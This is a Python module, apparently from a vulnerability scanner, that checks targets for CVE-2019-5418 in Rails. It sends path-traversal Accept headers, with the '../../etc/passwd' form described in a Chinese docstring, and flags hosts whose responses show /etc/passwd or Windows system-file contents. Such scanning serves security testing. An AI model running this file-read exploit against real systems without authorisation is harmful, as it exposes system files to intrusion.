#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
import re

def cve_2019_5418_scan(self, url):
    ''' 在控制器中通过render file形式来渲染应用之外的视图, 且会根据用户传入的Accept头来确定文件具体位置
        通过传入Accept: ../../../../../../../../etc/passwd{{头来构成构造路径穿越漏洞, 读取任意文件
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'File-Read'
    vul_info['vul_id'] = 'CVE-2019-5418'
    vul_info['vul_method'] = 'GET'

    for payload in self.cve_2019_5418_payloads:
        path = payload['path']
        headers = payload['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )

            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
